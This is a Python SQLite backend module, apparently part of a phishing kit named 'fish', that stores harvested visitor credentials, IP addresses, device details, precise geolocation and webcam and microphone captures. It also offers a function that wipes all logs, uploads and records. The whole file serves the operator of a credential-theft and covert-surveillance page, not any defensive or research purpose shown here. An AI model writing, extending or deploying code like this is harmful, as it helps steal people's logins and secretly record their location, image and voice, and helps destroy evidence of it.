import sqlite3
import json
import os
from datetime import datetime
from contextlib import contextmanager
from fish_config import DB_PATH, UPLOADS_DIR, LOGS_DIR

@contextmanager
def get_db():
    conn = sqlite3.connect(DB_PATH)
    conn.row_factory = sqlite3.Row
    try:
        yield conn
    finally:
        conn.close()

def init_db():
    with get_db() as conn:
        c = conn.cursor()
        c.execute('''CREATE TABLE IF NOT EXISTS credentials
                     (id INTEGER PRIMARY KEY AUTOINCREMENT,
                      timestamp TEXT, ip TEXT, os TEXT, user_agent TEXT,
                      data TEXT)''')
        c.execute('''CREATE TABLE IF NOT EXISTS geo
                     (id INTEGER PRIMARY KEY AUTOINCREMENT,
                      timestamp TEXT, ip TEXT, os TEXT, lat REAL, lon REAL,
                      accuracy REAL, error TEXT)''')
        c.execute('''CREATE TABLE IF NOT EXISTS media
                     (id INTEGER PRIMARY KEY AUTOINCREMENT,
                      timestamp TEXT, ip TEXT, os TEXT, type TEXT, status TEXT,
                      filename TEXT)''')
        c.execute('''CREATE TABLE IF NOT EXISTS files
                     (id INTEGER PRIMARY KEY AUTOINCREMENT,
                      filename TEXT, original_name TEXT, size INTEGER,
                      upload_time TEXT, downloads INTEGER DEFAULT 0)''')
        c.execute('''CREATE TABLE IF NOT EXISTS visits
                     (id INTEGER PRIMARY KEY AUTOINCREMENT,
                      timestamp TEXT, ip TEXT, os TEXT, user_agent TEXT,
                      page TEXT, referer TEXT)''')
        conn.commit()

def save_cred_to_db(ts, ip, os_name, ua, data_dict):
    with get_db() as conn:
        conn.execute("INSERT INTO credentials (timestamp, ip, os, user_agent, data) VALUES (?,?,?,?,?)",
                     (ts, ip, os_name, ua, json.dumps(data_dict, ensure_ascii=False)))
        conn.commit()

def save_geo_to_db(ts, ip, os_name, lat=None, lon=None, acc=None, error=None):
    with get_db() as conn:
        conn.execute("INSERT INTO geo (timestamp, ip, os, lat, lon, accuracy, error) VALUES (?,?,?,?,?,?,?)",
                     (ts, ip, os_name, lat, lon, acc, error))
        conn.commit()

def save_media_to_db(ts, ip, os_name, media_type, status, filename=None):
    with get_db() as conn:
        conn.execute("INSERT INTO media (timestamp, ip, os, type, status, filename) VALUES (?,?,?,?,?,?)",
                     (ts, ip, os_name, media_type, status, filename))
        conn.commit()

def save_file_to_db(filename, original_name, size):
    with get_db() as conn:
        ts = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
        cur = conn.execute("INSERT INTO files (filename, original_name, size, upload_time) VALUES (?,?,?,?)",
                           (filename, original_name, size, ts))
        file_id = cur.lastrowid
        conn.commit()
        return file_id

def get_all_files():
    with get_db() as conn:
        cur = conn.execute("SELECT id, original_name, size, upload_time, downloads FROM files ORDER BY id DESC")
        return cur.fetchall()

def increment_download_count(file_id):
    with get_db() as conn:
        conn.execute("UPDATE files SET downloads = downloads + 1 WHERE id = ?", (file_id,))
        conn.commit()

def delete_file(file_id):
    with get_db() as conn:
        row = conn.execute("SELECT filename FROM files WHERE id = ?", (file_id,)).fetchone()
        if row:
            filename = row[0]
            filepath = os.path.join(UPLOADS_DIR, filename)
            if os.path.exists(filepath):
                os.remove(filepath)
            conn.execute("DELETE FROM files WHERE id = ?", (file_id,))
            conn.commit()

def save_visit_to_db(ip, os_name, ua, page, referer):
    with get_db() as conn:
        ts = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
        conn.execute("INSERT INTO visits (timestamp, ip, os, user_agent, page, referer) VALUES (?,?,?,?,?,?)",
                     (ts, ip, os_name, ua, page, referer))
        conn.commit()

def get_stats():
    with get_db() as conn:
        cred_count = conn.execute("SELECT COUNT(*) FROM credentials").fetchone()[0]
        geo_count = conn.execute("SELECT COUNT(*) FROM geo").fetchone()[0]
        webcam_count = conn.execute("SELECT COUNT(*) FROM media WHERE type='webcam' AND status='captured'").fetchone()[0]
        mic_count = conn.execute("SELECT COUNT(*) FROM media WHERE type='microphone' AND status='captured'").fetchone()[0]
        visit_count = conn.execute("SELECT COUNT(*) FROM visits").fetchone()[0]
    return cred_count, geo_count, webcam_count, mic_count, visit_count

def clear_all_logs():
    for root, dirs, files in os.walk(LOGS_DIR):
        for f in files:
            try:
                os.remove(os.path.join(root, f))
            except:
                pass
    for f in os.listdir(UPLOADS_DIR):
        try:
            os.remove(os.path.join(UPLOADS_DIR, f))
        except:
            pass
    with get_db() as conn:
        conn.execute("DELETE FROM credentials")
        conn.execute("DELETE FROM geo")
        conn.execute("DELETE FROM media")
        conn.execute("DELETE FROM visits")
        conn.execute("DELETE FROM files")
        conn.commit()

def get_recent_visits(limit=5):
    with get_db() as conn:
        cur = conn.execute(
            "SELECT timestamp, ip, os, page FROM visits ORDER BY id DESC LIMIT ?",
            (limit,)
        )
        return cur.fetchall()
